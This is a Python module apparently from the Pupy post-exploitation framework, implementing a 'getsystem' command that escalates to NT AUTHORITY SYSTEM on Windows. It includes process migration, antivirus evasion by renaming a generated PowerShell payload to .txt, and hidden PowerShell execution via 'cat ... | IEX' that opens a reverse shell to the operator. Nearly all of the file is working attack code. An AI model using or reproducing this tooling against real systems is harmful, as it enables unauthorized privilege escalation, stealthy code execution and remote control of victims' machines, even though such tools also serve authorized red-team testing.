# -*- coding: utf-8 -*-
from pupylib.PupyModule import *
from pupylib.utils.rpyc_utils import redirected_stdo
from modules.lib.windows.migrate import migrate
from rpyc.utils.classic import upload
import pupygen
import string
import random

__class_name__="GetSystem"

@config(compat="windows", category="privesc")
class GetSystem(PupyModule):

    """ try to get NT AUTHORITY SYSTEM privileges """

    dependencies=["pupwinutils.security"]

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="getsystem", description=cls.__doc__)
        cls.arg_parser.add_argument("--prog", default="cmd.exe", help="Change the default process to create/inject into")
        cls.arg_parser.add_argument('-m', dest='migrate', action='store_true', default=True, help="Used by default: migrate to the system process (could be detected by AV)")
        cls.arg_parser.add_argument('-r', dest='restart', action='store_true', default=False, help="Restart current executable as admin")
        cls.arg_parser.add_argument('-p', dest='powershell', action='store_true', default=False, help="Use powershell to automatically get a reverse shell")

    def run(self, args):

        local_file  = ''

        # restart current exe as system
        if args.restart:
            self.info('Using current executable')
            exe = self.client.desc['exec_path'].split('\\')
            if exe[len(exe)-1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':
                self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])
                self.warning('It is not recommended to restart it')
                return

            cmd = self.client.desc['exec_path']

        # use powerhell to get a reverse shell
        elif args.powershell:
            ros         = self.client.conn.modules['os']
            rtempfile   = self.client.conn.modules['tempfile']
            tempdir     = rtempfile.gettempdir()
            random_name = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(6)])
            remotefile  = ''

            self.info('Using powershell payload')
            if '64' in  self.client.desc['os_arch']:
                local_file = pupygen.generate_ps1(self.client.get_conf(), x64=True)
            else:
                local_file = pupygen.generate_ps1(self.client.get_conf(), x86=True)

            # change the ps1 to txt file to avoid AV detection
            random_name += '.txt'
            remotefile  = ros.path.join(tempdir, random_name)

            cmd     = u'C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe'
            param   = u'-w hidden -noni -nop -c "cat %s | Out-String | IEX"' % remotefile

            cmd = '%s %s' % (cmd, param)

            self.info("Uploading file in %s" % remotefile)
            upload(self.client.conn, local_file, remotefile)

        # migrate
        else:
            cmd     = args.prog

        with redirected_stdo(self):
            proc_pid = self.client.conn.modules["pupwinutils.security"].getsystem(prog=cmd)

        if args.migrate and not args.restart and not args.powershell:
            migrate(self, proc_pid)
            self.success("got system !")
        else:
            self.success("Waiting for a connection (take few seconds, 1 min max)...")

        if args.powershell:
            os.remove(local_file)
